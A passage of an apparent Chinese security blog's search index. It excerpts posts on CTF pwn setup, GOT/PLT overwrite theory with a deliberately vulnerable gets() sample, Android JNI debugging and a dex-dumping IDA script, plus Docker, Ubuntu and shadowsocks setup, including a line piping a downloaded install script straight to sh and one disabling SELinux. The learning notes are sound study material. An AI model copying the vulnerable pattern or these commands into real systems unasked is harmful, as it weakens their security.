        "excerpt":"  用到的命令：   # 挂载程序到本地端口 后台执行 ncat -ve ./pwn -kl 50001 &amp; # 查看网络情况 netstat -antpl # 查看so库加载地址 ldd ./demo1 # 查看ASLR开启情况 cat /proc/sys/kernel/randomize_va_space # gdb调试core gdb -q -c ./core   # 生成偏移 print pwn.cyclic(200) # 计算偏移 print pwn.cyclic_find('xaaa')  ","categories": [],
        "tags": ["pwn","stack"],
        "url": "https://zjgcjy.github.io/posts/2017-10/stackoverflow-2.html",
        "teaser":null},{
        "title": "Reversecore 1",
        "excerpt":"     《逆向工程核心原理》读书笔记-1    第二章   简单调试helloworld程序   首先熟悉一下基本过程吧，虽然大部分都知道了，但还是从基础的开始看，逆向就是要慢慢来的，不要急。-_-。 这里我用的就是ida了，没用od，调试器加载的位置是函数的入口点，不是所谓的主函数地址，一般都是从0x401000开始的，因为涉及到IAD表重定位的问题。而入口点一般在主函数下面。   call    ___security_init_cookie jmp     ___tmainCRTStartup   主要就2步ASM的过程，第一个call是安全机制检查，应该是canary吧，没详细查过，因为主函数退出之后也有个对吧，应该没错。第二个跳转到mainCRT函数，这是Visual C++启动函数。进入启动函数之后，编译器会做许多前期准备工作，我们要查找的主函数一般靠近最后部分。最明显的标识就是连续push三次了，ia32是这样的，ia64用寄存器可能不相同吧。之后就exit()了，这就是为什么main()里面可以调用exit()直接退出。   push    0               ; uType push    offset Caption  ; \"www.reversecore.com\" push    offset Text     ; \"Hello World!\" push    0               ; hWnd call    ds:MessageBoxW xor     eax, eax   主函数ASM如上，没什么好说的。要注意的地方就是在Win32编程中，VC++默认实用Unicode码，内部都是Unicode系列函数。  ","categories": [],
        "tags": ["reverse"],
        "url": "https://zjgcjy.github.io/posts/2017-10/reversecore-1.html",
        "teaser":null},{
        "title": "Androidjn Jni Debugging 1",
        "excerpt":"     Android Jni调试 这篇主要是依靠IDA进行调试So库函数，不涉及脱壳和反调试的内容。    基础篇   基本调试方式。   准备工作   把ida目录下android_server 传到android 目录中   adb push  android_server /data/local/tmp/ adb shell su cd /data/local/tmp/ chmod 755/777 android_server ./android_server IDA Android 32-bit remote debug s-Rays (c) 2004-2017 Listening on 0.0.0.0:23946...   在windows 控制台下转发window到模拟器或者手机的端口   adb forward tcp:23946 tcp:23946   开始调试   IDA 附加localhost 端口默认23946 ，选择远程Android调试。   如果出现： Bogus or irresponsive remote server 错误 在adb shell中执行 setenforce 0 关闭selinux安全机制（需要root权限） 之后在Debuggger 中的attach 上android 所对应的程序就行了 找到需要下断点的位置 设置断点，进行调试即可 现在本地模块中找到需要下断点的函数偏移 然后获取远程模块的基地址，基地址+偏移即是当前需要下断点的地址 Ctrl + s显示当前的所有加载的模块信息，找可读可执行的，一般代码段都是不可写的。 需要下断点的地址，然后设置断点，点击按钮就断下来了。   不懂的地方   还有几点不明白的地方      加载so的偏移量和我静态算的偏移量不一致，而网上所有教程都是一致的，不明白，鱼哥说是ASLR的问题，不过是RVA啊，不怎么明白。   jeb的作用没明白   linker的作用没明白   IDA加载方式，或者说dex加载so文件方式不明白。   进阶篇   采用调试模式启动，与传统方式不同的是，这种方式会使得dex未加载如内存。 注：jeb调试只需要使用adb然后debug启动apk就行了，不需要端口转发。 或者以调试模式启动   adb shell am start -w packagename/activity（此处记得用activity的绝对路径） e.g adb shell am start -D -n cn.chaitin.geektan.crackme/cn.chaitin.geektan.crackme.MainActivity adb shell ps |grep infomation adb forward tcp:0000 jdwp:0000   设置端口转发，这条命令的含义可以认为是在本地端口端口与手机进程之间建立一条通道 附加程序成功后，选择，Debugger option，勾选   suspend on process entry point suspend on thread start/exit suspend on library load/unload   三项，然后按f9运行调试程序，此时IDA pro 挂起 使用jdb恢复程序执行   jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=0000 jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=8700   此时IDA pro断在linker中，此时module中并没有libcrackme.so，说明licrackme.so还没有加载到内容中，只需要跟几步f8，在寄存器中看到libcrackme.so加载进来了，就可以在module中找到，有两种情况      如果IDA Pro能够解析成功，双击module中的libcrackme.so就可以看到它export的函数，就可以右键下断点了   如果IDA Pro解析失败，需要再开一个IDA，查找到要下断的函数地址，加上libcrackme.so加载到内存的地址即可(在init_array下断只能使用这种方法)。   IDA Pro按F9几次，直到断在自己下断的地方即可。   高级篇   也不算高级篇，记一下第三种ida调试技巧。 首先把要分析的libcrackme.so文件拉进IDA里面在要下断点的JNI_Onload处下好断点。 启动android_server与上面一样 端口转发以及调试模式启动 先设置一下Debugger为远程Android模式 IDA进行附加进程回到之前静态分析libcrackme.so的IDA界面单击Debugger -&gt; Process options 配置调试信息，这里只需配置hostname为localhost 点击Debugger -&gt; Attach to process进行附加进程 jdwp转发（当然打开DDMS就不需要这一步了）jdb附加当时需要吗？为什么我现在用ida都不需要。。其实就是第一种方式。 F9执行一路到断点，一般需要点击按钮事件。  ","categories": [],
        "tags": ["android","reverse"],
        "url": "https://zjgcjy.github.io/posts/2017-10/AndroidJn-Jni-debugging-1.html",
        "teaser":null},{
        "title": "Android Jni Debugging 2",
        "excerpt":"     Android Jni调试    JNI_OnLoad   JNI_ OnLoad函数大概功能就是在程序加载so的时候，会执行JNI_ OnLoad函数，做一系列的准备工作。 很多时候，程序猿们会将一些重要信息放在此函数中，而不是通过某种事件来重复触发。包括说将反调试函数放置在此函数中。因此，调试手段发生了改变，上述调试方法基本上被淘汰。   当这种调试手法出现之后，将特殊函数，或者反调试函数放在JNI_ OnLoad中也不是那么的安全了。此时，程序猿们通过分析系统对SO文件的加载链接过程发现，JNI_ OnLoad函数并不是最开始执行的。在JNI_ OnLoad函数执行之前，还会执行init段和init_array中的一系列函数。 因此，现在的调试方法，都是将断点下在init_array中~ 至于下断点的方法，可以类比于在JNI_ OnLoad中下断点的方法，在init_ array的函数中下断点。还有一种方法便是通过在linker模块中，通过对其中函数下断点，然后也能单步到init_array中   Dump dex文件   关键是找到加载dex文件的位置，在调用函数处下断点，比如dvmDexFileOpenPartia，然后看寄存器的值，容易得知：R0寄存器指向的地址就是dex文件在内存中的地址，R1寄存器就是dex文件的大小。IDA脚本：   static main(void) {   auto fp, begin, end, dexbyte;   fp = fopen(\"C:\\\\dump.dex\", \"wb\");   begin = r0;   end = r0 + r1;   for ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )       fputc(Byte(dexbyte), fp); }   当然这只是最简单脱壳方法，很多高级壳会动态修改dex的结构体，比如将codeoffset指向内存中的其他地址，这样的话你dump出来的dex文件其实是不完整的，因为代码段保存在了内存中的其他位置。   其他   我们知道在so的加载时候有个这个过程： .init-&gt;-&gt;.init array-&gt;-&gt;JNI_ Onload-&gt;-&gt;java_ com_XXX; 还有我们在脱壳的过程中会在一些系统级的.so中下断点比如：fopen,fget,dvmdexfileopen,等等 而.init以及.init_array一般会作为壳的入口地方，那我们索性叫它外壳级的.so文件 这里归纳为三类： 应用级别的：java_ com_XXX； 外壳级别的：JNI_ Onload,.init,.init_array; 系统级别的：fopen,fget,dvmdexfileopen； 对于在应用级别的和系统级别的就不说了比较简单容易理解，这里也是在实现篇中会重点说的，看到上面的.so的加载执行过程我们知道如果说反调试放在外壳级别的.so文件的话我们就会遇程序在应用级核心函数一下断点就退出的尴尬，事实上多数的反调试会放在这，那么过反调试就必须要在这些地方下断点，那么我们就重点的说如何在.init_ array和JNI_Onload处理下断点。  ","categories": [],
        "tags": ["android","reverse"],
        "url": "https://zjgcjy.github.io/posts/2017-10/android-JNI-debugging-2.html",
        "teaser":null},{
        "title": "Docker Using",
        "excerpt":"     讲一下docker的用法。 关于ubuntu16.04安装最新docker的方法，参照官网手册。    拉取镜像   可以使用   docker search ...   查找有关镜像 然后使用   docker pull ...   拉取镜像   查看镜像   查看所有镜像   docker images   启动镜像   有好几种启动方式。   直接运行   docker run ubuntu:14.04 /bin/echo 'Hello world'   这跟在本地直接执行 /bin/echo ‘hello world’ 几乎感觉不出任何区别。 下面的命令则启动一个 bash 终端，允许用户进行交互。   docker run -t -i ubuntu:14.04 /bin/bash   其中， -t 选项让Docker分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上， -i 则让容器的标准输入保持打开。   守护态运行   更多的时候，需要让 Docker 容器在后台以守护态（Daemonized）形式运行。此时，可以通过添加 -d 参数来实现。   docker run -d ubuntu:14.04   容器启动后会返回一个唯一的 id，也可以通过 docker ps 命令来查看容器信息。   docker ps   要获取容器的输出信息，可以通过 docker logs 命令。   关闭容器   可以使用   docker stop   来终止一个运行中的容器。 此外，当Docker容器中指定的应用终结时，容器也自动终止。 对于只启动了一个终端的容器，通过 exit 命令或 Ctrl+d 来退出终端时，所创建的容器立刻终止。终止状态的容器可以用   docker ps -a   看到。   处于终止状态的容器，可以通过   docker start   命令来重新启动。   docker restart   命令会将一个运行态的容器终止，然后再重新启动它。   进入容器   attach方式   当采用守护态启动容器时，使用attach可以附加到容器。 通过docker ps查看id就可以附加到运行的容器。   docker attach -itd 44fc0f0582d9     exec方式   docker在1.3.X版本之后还提供了一个新的命令exec用于进入容器，这种方式相对更简单一些，   docker exec --help   sudo docker exec -it 775c7c9ee1e1 /bin/bash   拷贝文件   cp命令用于主机和容器拷贝文件，防止每次都重建dockerfile。   docker cp foo.txt mycontainer:/foo.txt docker cp mycontainer:/foo.txt foo.txt   pwn dockerfile   FROM ubuntu MAINTAINER zjgcjy LABEL Description=\"zjgcjy_pwngame\" VERSION='1.0' # x86_Support RUN dpkg --add-architecture i386 # update RUN apt-get update # install something basic RUN apt-get install -y libc6:i386 libncurses5:i386 libstdc++6:i386\\     &amp;&amp;apt-get install -y socat sudo  # copy file COPY ./pwn /tmp/pwn COPY ./flag.txtGOT-AND-PLT/tmp/ # add user RUN useradd -U -m pwn # rights configtion RUN chown root:pwn /tmp/flag.txt\\     &amp;&amp;chown root:pwn /tmp/pwn RUN chmod  750 /tmp/pwn\\     &amp;&amp;chmod 740 /tmp/flag.txt  #WORKDIR /tmp/ CMD sudo -u pwn socat tcp-l:4444,fork exec:/tmp/pwn EXPOSE 4444  docker run -d -p 0.0.0.0:1111:4444 -t pwn    构建自定义镜像   编写完成Dockerfile之后，可以通过docker build命令来创建镜像。 基本的格式为 docker build [选项]路径，该命令将读取指定路径下的Dockerfile，并将该路径下的所有内容发送给Docker服务端，由服务端来创建镜像。因此一般建议放置Dockerfile的目录为空目录   docker build -t pwn .   删除images   1.停止所有的container，这样才能够删除其中的images： docker stop $(docker ps -a -q) 如果想要删除所有container的话再加一个指令： docker rm $(docker ps -a -q) 2.查看当前有些什么images docker images 3.删除images，通过image的id来指定删除谁 docker rmi &lt;image id&gt; 想要删除untagged images，也就是那些id为&lt;None&gt;的image的话可以用 docker rmi $(docker images | grep “^&lt;none&gt;” | awk “{print $3}”) 要删除全部image的话 docker rmi $(docker images -q)  ","categories": [],
        "tags": ["Docker"],
        "url": "https://zjgcjy.github.io/posts/2017-12/Docker-using.html",
        "teaser":null},{
        "title": "Got和plt表",
        "excerpt":"     Linux中elf文件链接过程比较重要的两个表，GOT表和PLT表。 在ELF文件的动态连接机制中，每一个外部定义的符号在全局偏移表 (Global Offset Table，GOT)中有相应的条目，如果符号是函数则在过程连接表(Procedure Linkage Table，PLT)中也有相应的条目，且一个PLT条目对应一个GOT条目。以简单的例子观察GOT与PLT的变化机制。    GOT表   概念:每一个外部定义的符号在全局偏移表（Global offset Table）中有相应的条目，GOT位于ELF的数据段中，叫做GOT段。 作用：把位置无关的地址计算重定位到一个绝对地址。程序首次调用某个库函数时，运行时连接编辑器（rtld）找到相应的符号，并将它重定位到GOT之后每次调用这个函数都会将控制权直接转向那个位置，而不再调用rtld。   PLT表   过程连接表(Procedure Linkage Table)，一个PLT条目对应一个GOT条目 当main()函数开始，会请求plt中这个函数的对应GOT地址，如果第一次调用那么GOT会重定位到plt，并向栈中压入一个偏移，程序的执行回到_init()函数，rtld得以调用就可以定位printf的符号地址，第二次运行程序再次调用这个函数时程序跳入plt，对应的GOT入口点就是真实的函数入口地址。 动态连接器并不会把动态库函数在编译的时候就包含到ELF文件中,仅仅是在这个ELF被加载的时候,才会把那些动态函库数代码加载进来,之前系统只会在ELF文件中的GOT中保留一个调用地址.   GOT覆写技术   原理：由于GOT表是可写的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。   #include &lt;stdio.h&gt; #include &lt;string.h&gt;  void win(){ \tprintf(\"you win\\n\"); } int main(){ \tchar array[100]; \tgets(array); \tprintf(\"you lose\\n\"); \treturn 0; }   用gdb调试，disass main可以看到main的反汇编代码，我们可以观察到gets@plt和puts@plt这两个函数，为什么后面加了个@plt，因为这个为PLT表中的数据的地址。那为什么反编译中的代码地址为PLT表中的地址呢。   Dump of assembler code for function main:    0x00000000004005fd &lt;+0&gt;:\tpush   rbp    0x00000000004005fe &lt;+1&gt;:\tmov    rbp,rsp    0x0000000000400601 &lt;+4&gt;:\tsub    rsp,0x70    0x0000000000400605 &lt;+8&gt;:\tmov    rax,QWORD PTR fs:0x28    0x000000000040060e &lt;+17&gt;:\tmov    QWORD PTR [rbp-0x8],rax    0x0000000000400612 &lt;+21&gt;:\txor    eax,eax    0x0000000000400614 &lt;+23&gt;:\tlea    rax,[rbp-0x70]    0x0000000000400618 &lt;+27&gt;:\tmov    rdi,rax    0x000000000040061b &lt;+30&gt;:\tcall   0x4004f0 &lt;gets@plt&gt;    0x0000000000400620 &lt;+35&gt;:\tmov    edi,0x4006dc    0x0000000000400625 &lt;+40&gt;:\tcall   0x4004b0 &lt;puts@plt&gt;    0x000000000040062a &lt;+45&gt;:\tmov    eax,0x0    0x000000000040062f &lt;+50&gt;:\tmov    rdx,QWORD PTR [rbp-0x8]    0x0000000000400633 &lt;+54&gt;:\txor    rdx,QWORD PTR fs:0x28    0x000000000040063c &lt;+63&gt;:\tje     0x400643 &lt;main+70&gt;    0x000000000040063e &lt;+65&gt;:\tcall   0x4004c0 &lt;__stack_chk_fail@plt&gt;    0x0000000000400643 &lt;+70&gt;:\tleave      0x0000000000400644 &lt;+71&gt;:\tret        原因： 为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的。 PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址，好坑啊。 其实在大家进入带有@plt标志的函数时，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。可以通过disass gets看看里面的代码：   disass gets Dump of assembler code for function gets@plt:    0x00000000004004f0 &lt;+0&gt;:\tjmp    QWORD PTR [rip+0x200b42]        # 0x601038 &lt;gets@got.plt&gt;    0x00000000004004f6 &lt;+6&gt;:\tpush   0x4    0x00000000004004fb &lt;+11&gt;:\tjmp    0x4004a0 End of assembler dump.   可以发现，这个函数只有三行代码，第一行跳转，第二行压栈，第三行又是跳转。 解释： 第一行跳转，它的作用是通过PLT表跳转到GOT表，而在第一次运行某一个函数之前，这个函数PLT表对应的GOT表中的数据为@plt函数中第二行指令的地址，针对图中来说步骤如下：   jmp指令跳转到GOT表 GOT表中的数据为0x400486 跳转到指令地址为0x400486 执行push 0x4#这个为在GOT中的下标序号 在执行jmp 0x400440 而0x400440为PLT[0]的地址 PLT[0]的指令会进入动态链接器的入口 执行一个函数将真正的函数地址覆盖到GOT表中  ","categories": [],
        "tags": ["pwn","linux"],
        "url": "https://zjgcjy.github.io/posts/2017-12/got%E5%92%8Cplt%E8%A1%A8.html",
        "teaser":null},{
        "title": "Ponce Using",
        "excerpt":"     Ponce 使用笔记 IDA Pro 6.8 plugin,2016IDA插件大赛第一名，威力无需多说，一键实现 angr 和 Triton。 angr之前一直想学习的，苦于不支持windows，暂时先放一下，之后PWN的时候用，开源项目，想想就激动。 Trition也是自动二进制分析框架，整合pin，可在windows下用，但是装的lib太多了，我就没折腾弄。    使用模式   Tainting engine   This engine is used to determine at every step of the binary’s execution which parts of memory and registers are controllable by the user input. 污染引擎：这种模式是用来确定文件运行的每一步中，内存和寄存器哪些部分可以用用户控制输入。   Symbolic engine   This engine maintains a symbolic state of registers and part of memory at each step in a binary’s execution path. 符号引擎：这种模式维持了当程序运行过程中，寄存器和内存部分的符号状态。   例子   使用符号引擎解决crackme   否认并注入条件   一开始以为很烦的，试了一个example，又自己试了试，挺简单的，容易上手，首先就设置模式，这里肯定就是符号引擎，记录寄存器和内存的符号状态。然后每个有关条件的跳转，比如说jne,jg,jz,js,jl等等，记录下值。我们在设置好之后就先运行一边看看第一次条件判断在哪里，也可以自己先分析，然后在关键的check中再自动化分析。之后每次根据条件判断，我们选择我们需要的方向，改变原来程序的走向，最终走向我们的目的地。改变程序流快捷键Ctrl+Shift+N，就是否认并且注入该处的条件。  ","categories": [],
        "tags": ["reverse","ponce"],
        "url": "https://zjgcjy.github.io/posts/2017-12/Ponce-using.html",
        "teaser":null},{
        "title": "Ubuntu Install",
        "excerpt":"     Something about in installing Ubuntu16.04.3_amd64 dpkg -l | grep linux-image，或者name -a发现16.04.3已经是4.10的内核了。考虑到pwntools，pwndbug，angr对ubuntu17的兼容性，这个版本够用。就用这个beta。    ubuntu禁止guest用户登陆   1、打开终端（快捷键 Ctrl+Alt+T） 2、编辑50-no-guest.conf。 sudo gedit /usr/share/lightdm/lightdm.conf.d/50-no-guest.conf 3、在打开的窗口中输入 [SeatDefaults] allow-guest=false   开启root用户   先改密码。   sudo passwd root   然后就可以su或者sudo了。   使用root用户登陆   sudo gedit /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf   在最后增加greeter-show-manual-login=true 登陆的时候会出现：读取/root/.profile时发现错误。   gedit /root/.profile   找到mesg n，修改为：tty -s &amp;&amp; mesg n   卸载libreOffice、Amazon的   ubuntu自带的开源office软件，体验效果不如windows上的office。   sudo apt-get remove libreoffice-common   sudo apt-get remove unity-webapps-common   删除不常用的软件   sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot sudo apt-get remove gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku  landscape-client-ui-install   sudo apt-get remove onboard deja-dup   运行x86程序   为了在64位系统上运行x86程序，我们需要添加x86平台并且安装库。 install libc6:i386,libncurses5:i386,libstdc++6:i386   sudo dpkg --add-architecture i386 sudo apt-get update sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 sudo apt-get upgrade sudo apt-get install libc6-dev-i386   安装开发库和头文件   apt-get install build-essential apt-get install linux-headers-$(uname -r)   unity-tweak-tool   调整 Unity 桌面环境，推荐使用Unity Tweak Tool，这是一个非常好用的 Unity 图形化管理工具，可以修改工作区数量、热区等。 如果安装完成之后发现运行不了，很可能是之前的删除不用的软件给删除了，所以在安装之前先安装一个库。   sudo apt-get install unity-webapps-common sudo apt-get install unity-tweak-tool   Flatabulous主题   Flatabulous主题是一款ubuntu下扁平化主题，也是我试过众多主题中最喜欢的一个！   sudo add-apt-repository ppa:noobslab/themes sudo apt-get update sudo apt-get install flatabulous-theme sudo add-apt-repository ppa:noobslab/icons sudo apt-get update sudo apt-get install ultra-flat-icons   字体   ubuntu自带的字体不太好看，所以采用文泉译微米黑字体替代，效果会比较好，毕竟是国产字体！   sudo apt-get install fonts-wqy-microhei   然后通过unity-tweak-tool来替换字体。   安装vmtools   sudo apt install open-vm-tools sudo apt install open-vm-tools-dkms     //实现文件夹共享， sudo apt install open-vm-tools-desktop  //桌面环境,支持双向拖放文件   终端   首先如果是Ubuntu14.04没有右键打开terminal的话，使用： sudo apt-get install nautilus-open-terminal 安装一个插件就行，reboot见效。 终端采用zsh和oh-my-zsh，既美观又简单易用，主要是能提高你的逼格！！！   首先，安装zsh：   sudo apt-get install git sudo apt-get install zsh sudo wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh   所以这时的zsh 基本已经配置完成,你需要一行命令就可以切换到 zsh 模式。   chsh -s /usr/local/bin/zsh   设置zsh代替bash作为默认终端，可是，chsh命令执行后没效果，打开终端还是bash 于是用土办法，编辑.bashrc配置文件   vim .bashrc     在最后一行写上zsh，这样终端每次打开都会自动执行zsh，那么就变成zsh了！ 也可以直接改 /etc/passwd的shell。 sudo vim /etc/passwd 将 root 的路径修改成 zsh 的路径即可。 root:x:0:0:root:/root:bash  改为 root:x:0:0:root:/root:/bin/zsh 最后，修改配色，在终端任意地方右键，profile-&gt;profile Preferences-&gt;colors一栏：配置，文字和背景采用系统主题，透明度设为10%，palette采用Tango。 关于zsh的详细配置可以查看：http://www.jianshu.com/p/7de00c73a2bb。   root用户登录没有声音   临时方法： 在终端中执行命令：   pulseaudio --start --log-target=syslog   永久方法： 将上面的命令添加到用户启动脚本：   pulseaudio --start --log-target=syslog   ubuntu会遍历 “/etc/profile.d” 目录下的所有*.sh 脚本文件。据此，我们只需要在 profile.d 文件夹中创建自己的启动配置脚本文件即可，不再需要修改 “etc/profile” 这个配置文件，还系统一个清净的环境。   安装特定开发包   安装OpenSSL sudo apt-get install libssl-dev 安装ffi.h sudo apt-get install libffi-dev 安装openssl.h sudo apt-get install openssl-devel 安装python模板库 sudo apt-get install python-dev python-pip apt-get install python-pip pip install – upgrade setuptools   安装pwntools   git clone https://github.com/Gallopsled/pwntools cd pwntools python setup.py install   安装pwndbg   git clone https://github.com/pwndbg/pwndbg cd pwndbg ./setup.sh   安装angr   如果有问题就把下面的做一下。   安装编译环境   apt-get install build-essential 顺便更新一下 apt-get update   Python Development Headers   安装python模板库 sudo apt-get install python-dev python3-dev python-pip python3-pip   安装pip相关   apt-get install python-pip pip install - - upgrade pip pip3 install - - upgrade pip pip install - - upgrade setuptools pip3 install - - upgrade setuptools   安装capstone git clone https://github.com/aquynh/capstone cd capstone make make install    ","categories": [],
        "tags": ["ubuntu"],
        "url": "https://zjgcjy.github.io/posts/2017-12/ubuntu-install.html",
        "teaser":null},{
        "title": "Vps结合bbr搭建ss服务器",
        "excerpt":"     首先详述一下搭建VPS的过程。这里使用VULTR东京机房的Ubuntu16.04。 其次前几天同学给我介绍了一下BBR算法，是Google推出的TCP拥塞避免新方案，亲测效果很好，所以记下来搭建过程。    搭建过程   首先选择东京机房和Ubuntu16.04，基本功能，5刀每月。因为VULTR支持按时收费，所以方便多了，不用了直接关闭就行。然后XSHELL直连。 然后，就需要开始搭建shadowsocks（科学上网） 和 BBR。   BBR   因为Linux4.9的内核已经支持TCP BBR了，所以我们将内核升级到4.9.10。   下载安装包：   wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.9.10/linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb   安装:   dpkg -i linux-image-4.9.10-040910-generic_4.9.10-040910.201702141931_amd64.deb   查看当前系统中都有哪些内核：   dpkg -l | grep linux-image   删除旧的内核，我这里的旧内核版本是4.8.0-30，所以执行：   apt-get purge *4.8*   现在再查看内核发现只剩下4.9.10的内核了，更新引导并重启：   update-grub reboot   重启之后编辑配置文件：   vim  /etc/sysctl.conf   在文件末尾加上下面两行： net.core.default_qdisc=fq net.ipv4.tcp_congestion_control=bbr   保存退出后执行 sysctl -p 使配置生效，并启动：   lsmod | grep bbr   如果看到tcp_bbr则说明启用成功   SS   然后，你就需要开始搭建你的shadowsocks：   apt-get install build-essential apt-get install python-pip pip install --upgrade pip pip install setuptools pip install shadowsocks   输入vim /etc/shadowsocks.json，用vi新建一个ss的配置   { \"server\":\"::\", \"server_port\": 6666, \"local_port\": 1080, \"timeout\": 300, \"password\": \"yourpassword\", \"method\":\"rc4-md5\", \"fast_open\":true, \"workers\":1 }   于是你就完成了shadowsocks的配置，然后:   ssserver -c /etc/shadowsocks.json -d start   你服务器的ss就跑起来啦！   ipv6 -&gt; ipv4   使用socat进行转发   nohup socat TCP6-LISTEN:6667,fork TCP4:127.0.0.1:6666 &amp;  ","categories": [],
        "tags": ["vps"],
        "url": "https://zjgcjy.github.io/posts/2018-01/VPS%E7%BB%93%E5%90%88BBR%E6%90%AD%E5%BB%BASS%E6%9C%8D%E5%8A%A1%E5%99%A8.html",
        "teaser":null},{
        "title": "Vimium Using",
        "excerpt":"     这篇文章是vim（vimuim）插件的参照表，主要用来查找用，提高Chrome使用的效率，部分快捷键已经很熟练了，之后要掌握一下高阶用法，同时也就当在用vim吧。    Crtl-in current page                  key       用法                       ?       帮助                 h       向左                 j       向下                 k       向上                 l       向右边                 gg       向最上                 G       向最下                 d       向下半页                 u       向上半页                 f       当前Tab打开链接                 F       新Tab打开链接                 r       重新加载                 gs       查看源代码                 i       输入模式，Esc退出                 yy       复制标签URL到剪贴板                 yf       复制链接到剪贴板                 gf       高亮下一帧                 gF       高亮主界面           Crtl-in new page                  key       用法                       o       当前Tab打开URL,bookm,history                 O       新Tab打开URL,bookm,history                 b       当前Tab打开bookm                 B       新Tab打开bookmark           Ctrl-find                  key       用法                       /       查询模式，Esc退出                 n       查找下一个                 N       查找上一个           Ctrl-history                  key       用法                       H       后退                 L       向前           Ctrl-Tab                  key       用法                       J, gT       切换左边一个Tab                 K, gt       切换右边一个Tab                 g0       切换第一个Tab                 g$       切换最后一个Tab                 ^       切换之前访问的一个Tab                 t       创建新Tab                 yt       duplicate current tab                 x       关闭当前Tab                 X       恢复关闭的Tab,撤销x操作                 T       通过搜索,切换Tab                        销/脱离当前Tab?           Ctrl-marks                  key       用法                       ma, mA       set local mark “a” (global mark “A”)                 a, A       jump to local mark “a” (global mark “A”)                 ``       jump back to the position before the previous jump before the previous gg, G, n, N, / or `a           Ctrl-Advanced Command                  key       用法                       ]], [[       Follow the link labeled ‘next’ or ‘&gt;’ (‘previous’ or ‘&lt;’) - helpful for browsing paginated sites                        open multiple links in a new tab                 gi       focus the first (or n-th) text input box on the page                 gu       go up one level in the URL hierarchy                 gU       go up to root of the URL hierarchy                 ge       edit the current URL                 gE       edit the current URL and open in a new tab                 zH       scroll all the way left                 zL       scroll all the way right                 v       enter visual mode; use p/P to paste-and-go, use y to yank                 V       enter visual line mode          ","categories": [],
        "tags": ["vim"],
        "url": "https://zjgcjy.github.io/posts/2018-01/vimium-using.html",
        "teaser":null},{
        "title": "Python Code For Hacker",
        "excerpt":"     读书笔记——《Python灰帽子-黑客与逆向工程师的python编程之道》 由于书上采用的是immunity debugger作为调试器，而我感觉现在已经过期了，所以在阅读的时候并没有实现，简单的阅读看了看就完了，还有fuzz和sulley等模糊测试框架技术，虽然也可以和漏洞挖掘结合起来，但是感觉用的比较少吧，这里没有写。（其实并不清楚-_-）。 HOOK，DLL注入，IDC脚本编程是以后要着重掌握的。    关于调试器   软件断点   软件断点只能中止执行。软件断点由于    缺乏硬件支持，一般都是模拟出来的。软件断点用触发寄存器的指令替换原来的指令。在x86处理器里，这条新指令通常是INT 3（0xCC）。调试器必须记录原来的指令。 当软件断点被触发时，INT 3指令把控制权传给寄存器。寄存器在内部表里查找断点，并用原来的指令替换INT 3，然后恢复指令指针，使保存的指令成为下一条要执行的指令。整个过程对用户来说是不可见的，调试器将显示包含原来的指令的反汇编。   硬件断点   X86系列处理器支持4种硬件断点。硬件断点使用特殊的调试寄存器。这些寄存器包含断点地址、控制信息及断点类型。 断点地址保存在调试寄存器D0至D3中。为了设置断点，需要有一个字段，大小可以是1、2或4字节。执行中断使用的大小为1字节。 在64位CPU上，大小已经扩展到8字节。有多种条件可以出发断点： 一、执行中断； 二、内存访问中断（读内存或写内存）； 三、仅写内存时中断； 四、I/O端口访问中断（很少被使用，很多调试器没有这个设置）   内存断点   内存断电本质上不是断点，只是依靠操作系统对内存页的分配权限和调试器收到的返回异常来下断。操作系统美分配一个内存页的时候，都会为这个内存页设置相应的访问权限，该权限取决鱼这个内存页被访问的方式。主要有以下几个：页可执行：如果试图读写这个页将导致非法内存操作异常。页可读：只能读取数据，企图写入数据或者执行代码都会导致内存操作异常。页可写：只允许写数据。保护页：对保护页的任何一次操作都会导致一次异常。   使用断点   调试器使用软件断点要多于硬件断点。最主要的理由是软件断点没有数量的限制。有些反调试技术会通过计算代码的校验和判断是否有指令被修改了。 硬件断点可以设在内存地址上，这点与软件断点不一样。我们可以通过中断内存访问寻找使用的表或内存崩溃。   关于HOOK和DLL   这部分内容由于书写的比较老，自己只知道了一些基础知识，对于怎么具体使用并没有心得，是之后的学习中需要加强的一部分，尤其是HOOK技术，在apk逆向中使用比较多，结合xposed可以实现快速自动化分析。   IDAPython脚本编程   两个工具函数   ScreanEA() 获取鼠标所停留的地址，可以通过这个来为脚本指定起始地址。hex(ScreanEA()) GetInputFileMD5() 计算当前载入文件的MD5值，可以用来检测文件是否被更改，尤其是patch的时候，尽管有patch_list显示。   段   Firstseg() 返回文件中首个段的起始地址。hex(Firstseg()) Nextseg(long Address) 根据当前位置，返回下一个段的起始位置。 SegByName(string SegmentName) 根据段名称，返回段的起始地址。试了一下好像有问题。 SegEnd(long Address) 根据地址返回该段的结束地址 SegStart(long Address) 根据地址返回该段的起始地址 SegName(long Address) 根据地址，返回该地址的段名称 Segments() 返回段首地址的列表   函数   Function(long StartAddress, long EndAddress) 返回函数地址列表，在起始地址和结束地址之间。 Chunks(long FunctionAddrss) 根据地址返回块列表，以python二元组的形式（chunks start,chunks end）存储每个函数块的起始结束地址。 LocByName(string FunctionName) 根据函数名称返回函数地址 GetFuncOffset(long Address) 将函数内部地址转换成函数名后跟偏移的字符串 GetFuncitonName(long Address) 根据地址返回函数名称   交叉引用   CodeRefsTo(long Address,bool Flow) 